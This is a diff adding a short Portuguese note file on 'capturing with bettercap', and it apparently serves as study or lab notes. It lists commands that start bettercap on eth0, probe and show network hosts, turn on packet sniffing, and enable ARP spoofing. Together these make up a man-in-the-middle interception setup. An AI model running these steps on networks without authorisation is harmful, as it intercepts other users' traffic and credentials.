@@ -1,0 +1,14 @@
+capiturando com o bettercap
+
+
+sudo bettercap -iface eth0
+
+net.probe
+
+net.show
+
+
+
+net.sniff on
+
+arp.spoof on
